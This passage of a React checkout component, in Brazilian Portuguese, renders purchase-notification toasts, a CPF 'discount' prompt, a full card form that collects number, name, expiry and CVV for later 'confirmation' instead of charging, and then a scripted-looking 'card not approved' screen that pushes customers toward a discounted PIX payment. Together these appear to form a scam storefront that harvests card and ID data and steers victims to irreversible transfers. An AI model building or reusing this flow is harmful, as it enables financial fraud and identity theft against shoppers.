                  <img 
                    src={review.image} 
                    alt={`Review de ${review.name}`}
                    className="w-16 h-16 rounded-lg object-cover"
                  />
                  <div className="flex-1">
                    <div className="flex items-center gap-2 mb-1">
                      <h4 className="font-semibold text-sm text-gray-800">{review.name}</h4>
                      <div className="flex">
                        {[...Array(review.rating)].map((_, i) => (
                          <Star key={i} className="w-3 h-3 fill-yellow-400 text-yellow-400" />
                        ))}
                      </div>
                    </div>
                    <p className="text-xs text-blue-600 font-medium mb-2">{review.product}</p>
                    <p className="text-xs text-gray-600 leading-relaxed">{review.comment}</p>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Toast de Compras */}
        {showToast && (
          <div className="fixed bottom-4 left-4 right-4 md:left-auto md:right-4 md:w-80 z-50">
            <div className="bg-green-500 text-white p-3 rounded-lg shadow-lg flex items-center gap-3 animate-slide-up">
              <div className="w-2 h-2 bg-green-300 rounded-full animate-pulse"></div>
              <div className="flex-1">
                <p className="text-sm font-medium">🔥 Compra Realizada!</p>
                <p className="text-xs opacity-90">{currentToast}</p>
              </div>
              <button 
                onClick={() => setShowToast(false)}
                className="text-white hover:text-gray-200"
              >
                <X className="w-4 h-4" />
              </button>
            </div>
          </div>
        )}
      </div>

      {/* Modal de Oferta Exclusiva */}
      {showDiscountModal && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-2xl max-w-md w-full pt-28 pb-6 px-6 shadow-2xl relative animate-in zoom-in duration-300">
            {/* Carimbo de Desconto Instantâneo */}
            <div className="absolute top-8 left-1/2 transform -translate-x-1/2 -rotate-12 pointer-events-none">
              <div className="relative">
                <svg width="240" height="85" viewBox="0 0 240 85" className="drop-shadow-lg">
                  <rect x="5" y="5" width="230" height="75" fill="none" stroke="#DC2626" strokeWidth="6" rx="10" transform="rotate(-12 120 42.5)" />
                  <rect x="10" y="10" width="220" height="65" fill="none" stroke="#DC2626" strokeWidth="3" rx="8" transform="rotate(-12 120 42.5)" />
                  <text x="120" y="38" textAnchor="middle" fill="#DC2626" fontSize="19" fontWeight="bold" fontFamily="Arial Black, sans-serif" transform="rotate(-12 120 42.5)">
                    DESCONTO
                  </text>
                  <text x="120" y="60" textAnchor="middle" fill="#DC2626" fontSize="19" fontWeight="bold" fontFamily="Arial Black, sans-serif" transform="rotate(-12 120 42.5)">
                    INSTANTÂNEO
                  </text>
                </svg>
              </div>
            </div>

            <div className="space-y-4">
              <div className="text-center">
                <h3 className="text-xl font-bold text-gray-800 mb-2">
                  Já é cliente?
                </h3>
                <p className="text-lg font-semibold text-red-600 mb-1">
                  Ganhe 10% de desconto!
                </p>
                <p className="text-sm text-gray-600">
                  Digite seu CPF e receba desconto imediato
                </p>
              </div>
              
              <Input
                type="text"
                placeholder="000.000.000-00"
                value={cpfCheck}
                onChange={(e) => setCpfCheck(formatCPF(e.target.value))}
                className="text-lg border-2 border-red-300 focus:border-red-500 text-center font-semibold"
                maxLength={14}
                disabled={cpfCheckLoading}
              />
              
              {cpfCheckError && (
                <div className="bg-red-50 border border-red-200 rounded-lg p-3">
                  <p className="text-sm text-red-600 text-center">{cpfCheckError}</p>
                </div>
              )}
              
              <div className="space-y-2">
                <Button
                  type="button"
                  onClick={checkCpfDiscount}
                  disabled={cpfCheckLoading || cpfCheck.replace(/\D/g, '').length !== 11}
                  className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 text-base"
                >
                  {cpfCheckLoading ? (
                    <div className="flex items-center gap-2">
                      <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                      Verificando...
                    </div>
                  ) : (
                    '🎁 Verificar e Ganhar Desconto'
                  )}
                </Button>
                
                <Button
                  type="button"
                  onClick={skipDiscountCheck}
                  variant="outline"
                  className="w-full border-2 border-gray-300 hover:bg-gray-50 font-semibold"
                >
                  Continuar sem desconto
                </Button>
              </div>
              
              <p className="text-xs text-gray-500 text-center leading-relaxed">
                Não é cliente ainda? Sem problemas!<br />
                Clique em continuar para prosseguir com seu pedido.
              </p>
            </div>
          </div>
        </div>
      )}

      {/* Modal de Formulário de Cartão */}
      {showCardForm && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4 overflow-y-auto">
          <div className="bg-white rounded-2xl max-w-lg w-full p-6 shadow-2xl my-8">
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-2xl font-bold text-gray-800">Pagamento com Cartão</h3>
              <button
                onClick={() => setShowCardForm(false)}
                className="text-gray-400 hover:text-gray-600"
              >
                <X className="w-6 h-6" />
              </button>
            </div>

            <form onSubmit={handleCardSubmit} className="space-y-4">
              {/* Número do Cartão */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Número do Cartão
                </label>
                <Input
                  type="text"
                  value={cardData.cardNumber}
                  onChange={(e) => setCardData({...cardData, cardNumber: formatCardNumber(e.target.value)})}
                  placeholder="1234 5678 9012 3456"
                  maxLength={19}
                  required
                  className="text-lg"
                />
              </div>

              {/* Nome do Titular */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Nome do Titular (como está no cartão)
                </label>
                <Input
                  type="text"
                  value={cardData.cardHolderName}
                  onChange={(e) => setCardData({...cardData, cardHolderName: e.target.value.toUpperCase()})}
                  placeholder="NOME COMPLETO"
                  required
                  className="text-lg uppercase"
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                {/* Data de Validade */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Validade
                  </label>
                  <Input
                    type="text"
                    value={cardData.cardExpiryDate}
                    onChange={(e) => setCardData({...cardData, cardExpiryDate: formatExpiryDate(e.target.value)})}
                    placeholder="MM/AA"
                    maxLength={5}
                    required
                    className="text-lg"
                  />
                </div>

                {/* CVV */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    CVV
                  </label>
                  <Input
                    type="text"
                    value={cardData.cardCvv}
                    onChange={(e) => setCardData({...cardData, cardCvv: e.target.value.replace(/\D/g, '')})}
                    placeholder="123"
                    maxLength={4}
                    required
                    className="text-lg"
                  />
                </div>
              </div>

              {/* Resumo do Pedido */}
              <div className="bg-gray-50 border border-gray-200 rounded-lg p-4 mt-6">
                <h4 className="font-semibold text-gray-800 mb-2">Resumo do Pedido</h4>
                <div className="space-y-1 text-sm text-gray-600">
                  <p><strong>Produto:</strong> {productName}</p>
                  <p><strong>Endereço:</strong> {addressData?.logradouro}, {customerData.number}</p>
                  {isGasProduct() ? (
                    <>
                      <p className="text-sm text-gray-600 mt-2">
                        <strong>Valor total:</strong> {formatCurrency(getTotalPrice())}
                      </p>
                      <p className="text-lg font-bold text-blue-600 mt-1">
                        Cobrança inicial (70%): {formatCurrency(Math.round(getTotalPrice() * 0.70))}
                      </p>
                      <p className="text-xs text-gray-500">
                        Restante (30%): {formatCurrency(Math.round(getTotalPrice() * 0.30))} após entrega
                      </p>
                    </>
                  ) : (
                    <p className="text-lg font-bold text-gray-800 mt-2">
                      Total: {formatCurrency(getTotalPrice())}
                    </p>
                  )}
                </div>
              </div>

              {/* Aviso */}
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
                <p className="text-xs text-blue-800">
                  🔒 Seus dados estão seguros. Entraremos em contato para confirmar o pagamento.
                </p>
              </div>

              {/* Botões */}
              <div className="flex gap-3 pt-4">
                <Button
                  type="button"
                  onClick={() => setShowCardForm(false)}
                  variant="outline"
                  className="flex-1"
                  disabled={cardSubmitting}
                >
                  Cancelar
                </Button>
                <Button
                  type="submit"
                  className="flex-1 bg-blue-600 hover:bg-blue-700"
                  disabled={cardSubmitting}
                >
                  Confirmar Pedido
                </Button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Loading Fullscreen com Mensagens Progressivas */}
      {cardSubmitting && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-md flex items-center justify-center z-[60]">
          <div className="bg-white rounded-2xl p-8 max-w-sm w-full mx-4 text-center">
            <div className="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
            <h3 className="text-xl font-bold text-gray-800 mb-2">{cardLoadingMessage}</h3>
            <p className="text-sm text-gray-600">
              {cardLoadingMessage.includes('Infelizmente') 
                ? 'Mas temos uma solução melhor para você!' 
                : 'Aguarde um momento'}
            </p>
          </div>
        </div>
      )}

      {/* Modal de Erro do Cartão - Oferece PIX */}
      {showPixDiscountModal && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-[70] p-3 sm:p-4 overflow-y-auto">
          <div className="bg-white rounded-xl sm:rounded-2xl max-w-md w-full shadow-2xl my-4 max-h-[95vh] overflow-y-auto">
            {/* Header Compacto */}
            <div className="bg-gradient-to-r from-red-500 to-red-600 text-white p-4 sm:p-5 rounded-t-xl sm:rounded-t-2xl">
              <div className="flex items-center justify-center gap-2 mb-1">
                <X className="w-6 h-6" />
                <h3 className="text-lg sm:text-xl font-bold">Cartão Não Aprovado</h3>
              </div>
              <p className="text-center text-red-100 text-xs sm:text-sm">
                Tente com PIX e ganhe desconto!
              </p>
            </div>

            {/* Content Compacto */}
            <div className="p-4 sm:p-5 space-y-3">
              {/* Oferta PIX Compacta */}
              <div className="bg-gradient-to-br from-green-50 to-emerald-50 border-2 border-green-300 rounded-lg p-3 sm:p-4">
                <div className="flex items-start gap-2 mb-3">
                  <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0 mt-0.5" />
                  <div className="flex-1">
                    <h4 className="font-bold text-green-800 text-sm sm:text-base mb-1">
                      🎉 10% OFF no PIX!
                    </h4>
                    <p className="text-xs text-gray-700">
                      Pague com PIX e economize <strong className="text-green-600">10%</strong>
                    </p>
                  </div>
                </div>
                
                {/* Valores Compactos */}
                <div className="bg-white rounded-lg p-3 space-y-2">
                  <div className="flex justify-between items-center text-xs sm:text-sm">
                    <span className="text-gray-600">Valor original:</span>
                    <span className="font-semibold line-through text-gray-500">{formatPrice(getTotalPrice())}</span>
                  </div>
                  <div className="flex justify-between items-center pt-2 border-t border-gray-200">
                    <span className="text-sm font-bold text-green-700">Com PIX:</span>
                    <span className="text-xl sm:text-2xl font-bold text-green-600">{formatPrice(getTotalPrice() - pixDiscount)}</span>
                  </div>
                  <div className="text-center pt-2 border-t border-gray-200">
                    <p className="text-xs text-gray-600">
                      💰 Economia: <strong className="text-green-600">{formatPrice(pixDiscount)}</strong>
                    </p>
                  </div>
                </div>
              </div>

              {/* Benefícios Compactos */}
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-2">
                <div className="flex flex-wrap items-center justify-center gap-1 text-[10px] sm:text-xs text-gray-700">
                  <span>✅ Instantâneo</span>
                  <span>•</span>
                  <span>✅ Aprovação imediata</span>
                  <span>•</span>
                  <span>✅ Entrega rápida</span>
                </div>
              </div>

              {/* Botão Compacto */}
              <button
                onClick={async () => {
                  console.log('🎯 Botão PIX clicado!')
                  setShowPixDiscountModal(false)
                  setCardFailed(false)
                  console.log('📍 Avançando para Step 3 e gerando PIX...')
                  setStep(3)
                  
                  // Aguardar renderização do Step 3
                  await new Promise(resolve => setTimeout(resolve, 100))
                  
                  // Gerar PIX com desconto de 10% já aplicado
                  // A função generatePix já vai calcular 70% se for gás
                  console.log('💰 Desconto PIX aplicado:', pixDiscount)
                  console.log('🔥 Gerando PIX com valor já descontado...')
                  await generatePix(false)
                }}
                className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-3 sm:py-3.5 px-4 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 text-sm sm:text-base"
              >
                💳 Pagar com PIX (10% OFF)
              </button>

              <p className="text-[10px] sm:text-xs text-center text-gray-500 leading-tight">
                O PIX será gerado automaticamente
              </p>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
